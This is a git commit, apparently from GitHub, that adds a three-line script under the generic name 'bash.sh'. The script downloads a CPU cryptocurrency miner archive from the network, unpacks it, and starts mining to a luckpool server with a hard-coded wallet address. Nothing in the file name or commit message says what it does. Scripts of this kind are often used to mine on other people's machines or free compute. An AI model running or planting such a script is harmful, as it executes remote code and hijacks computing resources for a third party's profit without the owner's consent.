a9cba7cee660c2362f009e15dec34b4c1a8b3dac
4sharedall4 <92596053+4sharedall4@users.noreply.github.com>
2021-10-15 23:27:08 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
+tar xf hellminer_cpu_linux.tar.gz 
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RL8rxcZ1XqTL2Xkf5jtd7Rwgq5FqkrZZED.8core -p x --cpu 40
